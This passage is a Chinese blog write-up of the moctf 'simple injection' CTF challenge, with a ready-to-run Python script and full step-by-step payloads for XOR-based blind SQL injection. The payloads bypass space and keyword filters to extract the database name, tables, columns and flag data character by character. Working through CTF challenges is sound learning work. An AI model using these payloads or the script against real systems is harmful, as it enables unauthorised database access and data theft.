@@ -1,0 +1,1086 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="xianyu123's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="关于题目的简单分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="moctf中的题目——简单注入">
+<meta property="og:url" content="https://xianyu123.me/2019/01/29/moctf中的题目——简单注入/index.html">
+<meta property="og:site_name" content="xianyu123&#39;s Blog">
+<meta property="og:description" content="关于题目的简单分析">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://images.xianyu123.club/easy_injection1.png?imageslim">
+<meta property="og:image" content="http://images.xianyu123.club/easy_injection2.png?imageslim">
+<meta property="og:image" content="http://images.xianyu123.club/easy_injection5.png?imageslim">
+<meta property="og:image" content="http://images.xianyu123.club/easy_injection4.png?imageslim">
+<meta property="og:image" content="http://images.xianyu123.club/easy_injection8.png?imageslim">
+<meta property="og:image" content="http://images.xianyu123.club/easy_injection9.png?imageslim">
+<meta property="og:image" content="http://images.xianyu123.club/easy_injection6.png?imageslim">
+<meta property="og:image" content="http://images.xianyu123.club/easy_injection7.png?imageslim">
+<meta property="og:updated_time" content="2019-05-11T12:52:58.623Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="moctf中的题目——简单注入">
+<meta name="twitter:description" content="关于题目的简单分析">
+<meta name="twitter:image" content="http://images.xianyu123.club/easy_injection1.png?imageslim">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '3WG8LC0SCP',
+      apiKey: 'fd95735b1b343c09b1c7aada663dfa7a',
+      indexName: 'dev_xianyu123',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"输入关键字搜索","hits_empty":"没有找到与 ${query} 相关的内容","hits_stats":"搜索到 ${hits} 条相关记录，共耗时 ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://xianyu123.me/2019/01/29/moctf中的题目——简单注入/">
+
+
+
+
+
+
+  <title>moctf中的题目——简单注入 | xianyu123's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xianyu123's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://xianyu123.me/2019/01/29/moctf中的题目——简单注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xianyu123">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xianyu123's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">moctf中的题目——简单注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-29T16:10:08+08:00">
+                2019-01-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeup-Web/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup:Web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/01/29/moctf中的题目——简单注入/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/01/29/moctf中的题目——简单注入/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/01/29/moctf中的题目——简单注入/" class="leancloud_visitors" data-flag-title="moctf中的题目——简单注入">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>关于题目的简单分析</p>
+<a id="more"></a>
+<p>首先右键查看网页源代码，发现了一段注释</p>
+<p><img src="http://images.xianyu123.club/easy_injection1.png?imageslim" alt></p>
+<p>然后在url中添加参数<code>?id=1</code>，发现有3个不同的页面，分别是<code>id=1,id=2,id=3</code>，如果<code>id的值</code>不存在则返回空页面</p>
+<p>然后使用<code>burp</code>的<code>intruder</code>模块载入字典进行fuzz测试，看过滤了哪些字符</p>
+<p><img src="http://images.xianyu123.club/easy_injection2.png?imageslim" alt></p>
+<p>发现<code>空格</code>，<code>&gt;</code>，<code>&lt;</code>，<code>&lt;&gt;</code>，<code>substr</code>，<code>or</code>，<code>regexp</code>，<code>union</code>等都被过滤了，但是<code>=</code>，<code>ascii</code>，<code>mid</code>，<code>^</code>没有被过滤，所以这里使用异或盲注</p>
+<p>异或的效果如下：</p>
+<p><img src="http://images.xianyu123.club/easy_injection5.png?imageslim" alt></p>
+<p><img src="http://images.xianyu123.club/easy_injection4.png?imageslim" alt></p>
+<p>根据测试，这里的注入应该是字符串型注入，所有payload的框架应该是<code>?id=1&#39;^(注入的语句)^&#39;</code></p>
+<p><code>ascii()=ascii值</code>返回的是0或1，0表示错误，1表示正确</p>
+<p>所有当<code>?id=1^0^0</code>时页面显示的是<code>?id=1</code>的页面，这是注入失败的返回页面</p>
+<p><img src="http://images.xianyu123.club/easy_injection8.png?imageslim" alt></p>
+<p>当<code>?id=1^1^0</code>时页面显示的是空页面，这是注入成功的返回页面</p>
+<p><img src="http://images.xianyu123.club/easy_injection9.png?imageslim" alt></p>
+<p>根据页面返回是否为空我们可以判断出是否注入成功。</p>
+<p>更多关于盲注的函数用法请参考<a href></a></p>
+<p>更多关于如何绕过空格过滤请参考<a href></a></p>
+<h2 id="注入库"><a href="#注入库" class="headerlink" title="注入库"></a>注入库</h2><h3 id="库名长度"><a href="#库名长度" class="headerlink" title="库名长度"></a>库名长度</h3><p>首先，我们应该尝试盲注出数据库名的长度，我们尝试构造payload：</p>
+<p><code>?id=1&#39;^(ascii(mid((length(database()))from(1)))=54)^&#39;</code></p>
+<p>注入库名长度的时候，我们手工测试就行了</p>
+<h3 id="注入出库名"><a href="#注入出库名" class="headerlink" title="注入出库名"></a>注入出库名</h3><p>知道了数据库的库名长度后，我们尝试注出库名，构造payload：</p>
+<p><code>?id=1&#39;^(ascii(mid((database())from(1)))=97)^&#39;</code></p>
+<p>第1位我手工注入，后面的几位就直接用脚本去跑，脚本代码我会在最后附上</p>
+<p>注入出库名为<code>moctf</code></p>
+<h2 id="注入表"><a href="#注入表" class="headerlink" title="注入表"></a>注入表</h2><h3 id="表的张数"><a href="#表的张数" class="headerlink" title="表的张数"></a>表的张数</h3><p>查询表的sql语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="keyword">count</span>(*))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="number">0x6d6f637466</span>)</span><br></pre></td></tr></table></figure>
+<p><code>table_schema</code>为库名的十六进制</p>
+<p>因为这里<code>*</code>被过滤了，所以<code>count(*)</code>我用<code>count(1)</code>代替</p>
+<p>构造出payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1'^(ascii(mid(((<span class="keyword">select</span>(<span class="keyword">count</span>(<span class="number">1</span>))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="keyword">database</span>())</span><br><span class="line">))<span class="keyword">from</span>(<span class="number">1</span>)))=<span class="number">51</span>)^<span class="string">'</span></span><br></pre></td></tr></table></figure>
+<h3 id="表名的长度"><a href="#表名的长度" class="headerlink" title="表名的长度"></a>表名的长度</h3><p>payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'^(ascii(mid(((<span class="keyword">select</span>(<span class="keyword">length</span>((<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="keyword">database</span>()))))))<span class="keyword">from</span>(<span class="number">1</span>)))=<span class="number">48</span>)^<span class="string">'</span></span><br></pre></td></tr></table></figure>
+<h3 id="注入出表名"><a href="#注入出表名" class="headerlink" title="注入出表名"></a>注入出表名</h3><p>查询表名的sql语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="number">0x74657374</span></span><br></pre></td></tr></table></figure>
+<p>这样查出来是很多行的表名</p>
+<p><img src="http://images.xianyu123.club/easy_injection6.png?imageslim" alt></p>
+<p>另外一种查询方式是使用<code>group_concat</code>,查询出来都是在一行的</p>
+<p>语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="number">0x74657374</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://images.xianyu123.club/easy_injection7.png?imageslim" alt></p>
+<p>我们使用第二张，因为这里使用第一中方法就需要使用<code>limit</code>,而<code>limit</code>需要使用空格，因为空格被过滤了。</p>
+<p>构造payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'^(ascii(mid(((<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="keyword">database</span>())))<span class="keyword">from</span>(<span class="number">1</span>)))=<span class="number">97</span>)^<span class="string">'</span></span><br></pre></td></tr></table></figure>
+<h2 id="注入字段"><a href="#注入字段" class="headerlink" title="注入字段"></a>注入字段</h2><h3 id="字段个数"><a href="#字段个数" class="headerlink" title="字段个数"></a>字段个数</h3><p>因为这里<code>*</code>被过滤了，所有<code>count(*)</code>我用<code>count(1)</code>代替</p>
+<p>sql语句为:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="keyword">count</span>(<span class="number">1</span>))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="number">0x776f726d</span>)</span><br></pre></td></tr></table></figure>
+<p>构造出payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'^(ascii(mid(((<span class="keyword">select</span>(<span class="keyword">count</span>(<span class="number">1</span>))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="number">0x646f5f7930755f6c316b655f6c6f6e675f7434626c655f6e616d65</span>)))<span class="keyword">from</span>(<span class="number">1</span>)))=<span class="number">50</span>)^<span class="string">'</span></span><br></pre></td></tr></table></figure>
+<h3 id="字段长度"><a href="#字段长度" class="headerlink" title="字段长度"></a>字段长度</h3><p>构造出payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'^(ascii(mid((<span class="keyword">select</span>(<span class="keyword">length</span>((<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="number">0x646f5f7930755f6c316b655f6c6f6e675f7434626c655f6e616d65</span>)))))<span class="keyword">from</span>(<span class="number">1</span>)))=<span class="number">57</span>)^<span class="string">'</span></span><br></pre></td></tr></table></figure>
+<h3 id="字段名"><a href="#字段名" class="headerlink" title="字段名"></a>字段名</h3><p>sql语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="number">0x776f726d</span>)</span><br></pre></td></tr></table></figure>
+<p>构造出payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'^(ascii(mid(((<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="number">0x646f5f7930755f6c316b655f6c6f6e675f7434626c655f6e616d65</span>)))<span class="keyword">from</span>(<span class="number">1</span>)))=<span class="number">51</span>)^<span class="string">'</span></span><br></pre></td></tr></table></figure>
+<h2 id="注入数据"><a href="#注入数据" class="headerlink" title="注入数据"></a>注入数据</h2><h3 id="数据个数"><a href="#数据个数" class="headerlink" title="数据个数"></a>数据个数</h3><p>sql语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="keyword">count</span>(*))<span class="keyword">from</span>(<span class="keyword">database</span>().do_y0u_l1ke_long_t4ble_name)</span><br></pre></td></tr></table></figure>
+<p>构造出payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'^(ascii(mid((<span class="keyword">select</span>(<span class="keyword">count</span>(*))<span class="keyword">from</span>(<span class="keyword">database</span>().do_y0u_l1ke_long_t4ble_name))<span class="keyword">from</span>(<span class="number">1</span>)))=<span class="number">49</span>)^<span class="string">'</span></span><br></pre></td></tr></table></figure>
+<h3 id="数据长度"><a href="#数据长度" class="headerlink" title="数据长度"></a>数据长度</h3><p>构造出payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'^(ascii(mid((<span class="keyword">select</span>(<span class="keyword">length</span>((<span class="keyword">select</span>(d0_you_als0_l1ke_very_long_column_name)<span class="keyword">from</span>(do_y0u_l1ke_long_t4ble_name)))))<span class="keyword">from</span>(<span class="number">2</span>)))=<span class="number">49</span>)^<span class="string">'</span></span><br></pre></td></tr></table></figure>
+<h3 id="数据值"><a href="#数据值" class="headerlink" title="数据值"></a>数据值</h3><p>sql语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(d0_you_als0_l1ke_very_long_column_name)<span class="keyword">from</span>(moctf.do_y0u_l1ke_long_t4ble_name)</span><br></pre></td></tr></table></figure>
+<p>构造出payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'^(ascii(mid(((<span class="keyword">select</span>(d0_you_als0_l1ke_very_long_column_name)<span class="keyword">from</span>(moctf.do_y0u_l1ke_long_t4ble_name)))<span class="keyword">from</span>(<span class="number">1</span>)))=<span class="number">109</span>)^<span class="string">'</span></span><br></pre></td></tr></table></figure>
+<p>附上脚本，这里没有使用二分查找，因为很菜，不太会，大佬勿喷！</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://119.23.73.3:5004/?id=1'</span></span><br><span class="line"><span class="comment">#这里是注入出数据库名字</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">'\'^(ascii(mid((database())from(&#123;num1&#125;)))=&#123;num2&#125;)^\''</span></span><br><span class="line">    database_name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            full_payload = payload.format(num1=str(i),num2=str(j))</span><br><span class="line">            print(full_payload)</span><br><span class="line">            r = requests.get(url+full_payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Welcome to MOCTF!'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                database_name += chr(j)</span><br><span class="line">                print(database_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> database_name</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里是注入出当前库所有表的名字</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table</span><span class="params">()</span>:</span></span><br><span class="line">    table_name = <span class="string">''</span></span><br><span class="line">    payload = <span class="string">'\'^(ascii(mid(((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))from(&#123;num1&#125;)))=&#123;num2&#125;)^\''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            full_payload = payload.format(num1=str(i),num2=str(j))</span><br><span class="line">            print(full_payload)</span><br><span class="line">            r= requests.get(url+full_payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Welcome to MOCTF!'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                table_name += chr(j)</span><br><span class="line">                print(table_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> table_name</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里是注入出当前表的字段名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">column</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">'\'^(ascii(mid(((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x646f5f7930755f6c316b655f6c6f6e675f7434626c655f6e616d65)))from(&#123;num1&#125;)))=&#123;num2&#125;)^\''</span></span><br><span class="line">    column_name=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">39</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            full_payload = payload.format(num1=str(i),num2=str(j))</span><br><span class="line">            print(full_payload)</span><br><span class="line">            r = requests.get(url+full_payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Welcome to MOCTF!'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                column_name += chr(j)</span><br><span class="line">                print(column_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> column_name</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里是注入出字段的值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">data</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">'\'^(ascii(mid(((select(d0_you_als0_l1ke_very_long_column_name)from(moctf.do_y0u_l1ke_long_t4ble_name)))from(&#123;num1&#125;)))=&#123;num2&#125;)^\''</span></span><br><span class="line">    data = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            full_payload = payload.format(num1=str(i),num2=str(j))</span><br><span class="line">            print(full_payload)</span><br><span class="line">            r = requests.get(url+full_payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Welcome to MOCTF!'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                data += chr(j)</span><br><span class="line">                print(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="comment">#调用database()函数获取数据库名</span></span><br><span class="line"><span class="comment">#database()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用table()函数获取表名</span></span><br><span class="line"><span class="comment">#table()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用column()函数获取表名</span></span><br><span class="line"><span class="comment">#column()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用data()函数获取表名</span></span><br><span class="line"><span class="comment">#data()</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+	<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2019/01/29/moctf中的题目——简单注入/">moctf中的题目——简单注入</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 xianyu123 的个人博客">xianyu123</a></p>
+  <p><span>发布时间:</span>2019年01月29日 - 16:10</p>
+  <p><span>最后更新:</span>2019年05月11日 - 20:52</p>
+  <p><span>原始链接:</span><a href="/2019/01/29/moctf中的题目——简单注入/" title="moctf中的题目——简单注入">https://xianyu123.me/2019/01/29/moctf中的题目——简单注入/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://xianyu123.me/2019/01/29/moctf中的题目——简单注入/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+	});
+    });  
+</script>
+
+
+      
+</div>
+
+
+    
+
+    
+
+    
+
+	
+	<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------　　　　本文结束　<i class="fa fa-heart"></i>　感谢您的阅读　　　　-------------</div>
+    
+</div>
+  
+</div>
+	
+	
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/25/mysql注入备忘录/" rel="next" title="mysql注入备忘录">
+                <i class="fa fa-chevron-left"></i> mysql注入备忘录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
